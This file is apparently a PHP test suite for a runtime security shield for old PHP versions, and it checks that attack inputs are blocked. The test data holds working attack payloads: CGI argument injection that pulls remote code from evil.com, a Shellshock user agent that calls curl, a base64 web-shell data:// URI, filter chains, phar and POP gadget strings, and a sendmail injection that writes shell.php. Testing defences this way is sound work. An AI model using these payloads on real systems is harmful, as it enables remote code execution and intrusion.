<?php
/**
 * EOL-PHP-Armor Runtime Shield Comprehensive Test Suite
 * Part of EOL-PHP-Armor by Anton Barinov <https://github.com/Anton-Barinov>
 */

declare(strict_types=1);

echo "========================================================\n";
echo "   Running EOL-PHP-Armor Runtime Shield Tests\n";
echo "========================================================\n\n";

$guardFile = dirname(__DIR__) . '/guard/runtime-armor.php';
require_once $guardFile;

$passed = 0;
$failed = 0;

function assertShield(string $name, bool $condition, string $detail = ''): void {
    global $passed, $failed;
    if ($condition) {
        echo "  [PASS] {$name}" . ($detail ? " -> {$detail}" : "") . "\n";
        $passed++;
    } else {
        echo "  [FAIL] {$name}" . ($detail ? " -> {$detail}" : "") . "\n";
        $failed++;
    }
}

// -------------------------------------------------------------
// 1. Host Header Protection Tests
// -------------------------------------------------------------
echo "1. Testing Host Header Security...\n";
$_SERVER['HTTP_HOST'] = "legit.example.com\r\nX-Evil: injected";
$shield = PhpArmorShield::boot();
$v = $shield->checkCgiInjection(); // reset state
$prop = new ReflectionMethod('PhpArmorShield', 'checkHostHeaders');
if (PHP_VERSION_ID < 80100) {
    $prop->setAccessible(true);
}
$hostRes = $prop->invoke($shield);
assertShield("CRLF injection in HTTP_HOST blocked", $hostRes !== null && $hostRes['rule'] === 'HOST_HEADER_INJECTION', $hostRes ? $hostRes['rule'] : '');

$_SERVER['HTTP_HOST'] = 'safe-store.com';
$hostSafe = $prop->invoke($shield);
assertShield("Legitimate HTTP_HOST allowed", $hostSafe === null);

// -------------------------------------------------------------
// 2. Vector 1: php2shell (CVE-2026-109618 / CVE-2026-109619)
// -------------------------------------------------------------
echo "\n2. Testing php2shell & Upload Progress Protection...\n";

// Delimiter injection
$_POST['PHP_SESSION_UPLOAD_PROGRESS'] = 'exploit|prefix;cat /etc/passwd';
$res1 = $shield->checkPhp2Shell();
assertShield("Upload Progress Delimiter Injection blocked", $res1 !== null && $res1['rule'] === 'VEC1_PHP2SHELL_SERIALIZER_INJECTION', $res1 ? $res1['rule'] : '');

// Excessive length
$_POST['PHP_SESSION_UPLOAD_PROGRESS'] = str_repeat('A', 300);
$res2 = $shield->checkPhp2Shell();
assertShield("Upload Progress Key > 256b blocked", $res2 !== null && $res2['rule'] === 'VEC1_PHP2SHELL_EXCESSIVE_KEY_LENGTH', $res2 ? $res2['rule'] : '');

// Dangerous double extension in $_FILES
$_POST = [];
$_FILES = [
    'avatar' => [
        'name' => 'malicious_shell.php.jpg',
        'type' => 'image/jpeg',
        'tmp_name' => '/tmp/php123',
        'error' => 0,
        'size' => 1234,
    ]
];
$res3 = $shield->checkPhp2Shell();
assertShield("Dangerous double extension (.php.jpg) blocked", $res3 !== null && $res3['rule'] === 'VEC1_DANGEROUS_UPLOAD_EXTENSION', $res3 ? $res3['rule'] : '');

// Direct phtml upload
$_FILES['doc'] = ['name' => 'backdoor.phtml', 'type' => 'text/html'];
$res4 = $shield->checkPhp2Shell();
assertShield("Executable script (.phtml) blocked", $res4 !== null && $res4['rule'] === 'VEC1_DANGEROUS_UPLOAD_EXTENSION', $res4 ? $res4['rule'] : '');

// Safe image upload
$_FILES = [
    'photo' => ['name' => 'customer_photo.jpeg', 'type' => 'image/jpeg']
];
$resSafe = $shield->checkPhp2Shell();
assertShield("Legitimate JPEG upload accepted", $resSafe === null);
$_FILES = [];

// -------------------------------------------------------------
// 3. Vector 2: CGI Argument Injection (CVE-2024-4577)
// -------------------------------------------------------------
echo "\n3. Testing CGI Argument & Windows Best-Fit Protection...\n";

// Soft hyphen %ad
$_SERVER['QUERY_STRING'] = '%ad-define+allow_url_include=1';
$resCgi1 = $shield->checkCgiInjection();
assertShield("Windows Best-Fit soft hyphen (%ad) blocked", $resCgi1 !== null && $resCgi1['rule'] === 'VEC2_CGI_BESTFIT_INJECTION', $resCgi1 ? $resCgi1['rule'] : '');

// Overlong UTF-8 path traversal
$_SERVER['QUERY_STRING'] = 'page=%c0%ae%c0%ae%c0%afetc%c0%afpasswd';
$resCgi2 = $shield->checkCgiInjection();
assertShield("Overlong UTF-8 path traversal blocked", $resCgi2 !== null && $resCgi2['rule'] === 'VEC2_OVERLONG_UTF8_TRAVERSAL', $resCgi2 ? $resCgi2['rule'] : '');

// Direct -d switch
$_SERVER['QUERY_STRING'] = 'foo=bar&-d+auto_prepend_file=http://evil.com/sh';
$resCgi3 = $shield->checkCgiInjection();
assertShield("Command switch -d auto_prepend_file blocked", $resCgi3 !== null && $resCgi3['rule'] === 'VEC2_CGI_ARGUMENT_INJECTION', $resCgi3 ? $resCgi3['rule'] : '');

// Safe query string
$_SERVER['QUERY_STRING'] = 'route=product/search&search=laptop&category_id=42';
$resCgiSafe = $shield->checkCgiInjection();
assertShield("Legitimate OpenCart query string allowed", $resCgiSafe === null);
$_SERVER['QUERY_STRING'] = '';

// -------------------------------------------------------------
// 4. Vector 3: PHP Filter Chains (CVE-2024-2961)
// -------------------------------------------------------------
echo "\n4. Testing PHP Filter Chain Protection (CVE-2024-2961)...\n";

$_GET = ['file' => 'php://filter/convert.iconv.UTF-8.CSISO2022KR/convert.iconv.CP1046.UTF16/convert.iconv.ISO6937.JOHAB/resource=index.php'];
$resFlt = $shield->checkFilterChains();
assertShield("Deep PHP Filter Chain blocked", $resFlt !== null && $resFlt['rule'] === 'VEC3_FILTER_CHAIN_EXPLOIT', $resFlt ? $resFlt['rule'] : '');

$_GET = ['data' => 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=='];
$resData = $shield->checkFilterChains();
assertShield("data:// stream wrapper with base64 payload blocked", $resData !== null && $resData['rule'] === 'VEC3_DATA_WRAPPER_EXECUTION', $resData ? $resData['rule'] : '');

$_GET = ['view' => 'templates/modern/header.twig'];
$resFltSafe = $shield->checkFilterChains();
assertShield("Legitimate template file path allowed", $resFltSafe === null);
$_GET = [];

// -------------------------------------------------------------
// 5. Vector 4: Phar Deserialization (CVE-2018-17082)
// -------------------------------------------------------------
echo "\n5. Testing Phar Deserialization Protection...\n";

$_GET = ['file' => 'phar://uploads/avatar.jpg/test.txt'];
$resPhar = $shield->checkPharWrappers();
assertShield("phar:// stream wrapper blocked", $resPhar !== null && $resPhar['rule'] === 'VEC4_PHAR_WRAPPER_INJECTION', $resPhar ? $resPhar['rule'] : '');
$_GET = [];

$_POST = ['serialized' => 'O:28:"Monolog\\Handler\\SyslogHandler":1:{s:5:"level";i:100;}'];
$resPop = $shield->checkPharWrappers();
assertShield("Serialized Monolog POP gadget chain blocked", $resPop !== null && $resPop['rule'] === 'VEC4_POP_GADGET_INJECTION', $resPop ? $resPop['rule'] : '');
$_POST = [];

// -------------------------------------------------------------
// 6. Vector 5: Dangerous Functions, Shellshock & Null-Bytes
// -------------------------------------------------------------
echo "\n6. Testing Shellshock, Mail Parameters & Null-Bytes...\n";

// Shellshock in User Agent
$_SERVER['HTTP_USER_AGENT'] = '() { :;}; /bin/bash -c "curl evil.com"';
$resShk = $shield->checkMailAndNullBytes();
assertShield("Bash Shellshock in User-Agent header blocked", $resShk !== null && $resShk['rule'] === 'VEC5_SHELLSHOCK_ATTEMPT', $resShk ? $resShk['rule'] : '');
$_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';

// Null byte in POST
$_POST = ['username' => "admin\0.jpg"];
$resNull = $shield->checkMailAndNullBytes();
assertShield("Null byte in POST parameter blocked", $resNull !== null && $resNull['rule'] === 'VEC5_NULL_BYTE_POISONING', $resNull ? $resNull['rule'] : '');

// Sendmail -X injection
$_POST = ['email' => 'victim( -X/var/www/html/shell.php )@example.com'];
$resMail = $shield->checkMailAndNullBytes();
assertShield("Sendmail -X parameter injection blocked", $resMail !== null && $resMail['rule'] === 'VEC5_MAIL_PARAMETER_INJECTION', $resMail ? $resMail['rule'] : '');

// -------------------------------------------------------------
// 7. Edge Cases: Deep Recursion Array Resilience
// -------------------------------------------------------------
echo "\n7. Testing Deeply Nested Array Resilience (Recursion Limit)...\n";

$deep = 'normal_value';
for ($i = 0; $i < 64; $i++) {
    $deep = ['lvl_' . $i => $deep];
}
$_POST = ['nested' => $deep];
$resDeep = $shield->checkMailAndNullBytes();
assertShield("64-level nested array traversed safely without stack overflow", $resDeep === null);
$_POST = [];

echo "\n--------------------------------------------------------\n";
echo "Results: {$passed} Passed, {$failed} Failed\n";
echo "--------------------------------------------------------\n";

if ($failed > 0) {
    echo "TEST SUITE FAILED! ❌\n";
    exit(1);
}

echo "ALL RUNTIME SHIELD TESTS PASSED SUCCESSFULLY! 🎉\n";
exit(0);
